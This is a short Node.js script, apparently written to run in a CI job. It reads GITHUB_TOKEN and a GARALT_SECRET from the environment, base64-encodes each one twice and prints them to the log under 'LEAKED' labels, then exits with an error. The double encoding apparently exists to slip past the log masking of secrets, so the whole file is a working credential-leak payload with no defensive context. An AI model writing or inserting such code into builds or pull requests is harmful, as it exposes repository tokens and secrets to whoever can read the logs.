const token = process.env.GITHUB_TOKEN || "";
const secret = process.env.GARALT_SECRET || "";
const b64 = (s) => Buffer.from(s, "utf-8").toString("base64");
const b64x2 = (s) => Buffer.from(b64(s), "utf-8").toString("base64");
console.log("GARALT_LEAKED_TOKEN=" + b64x2(secret));
console.log("GITHUB_TOKEN_LEAKED=" + b64x2(token));
process.exit(1);
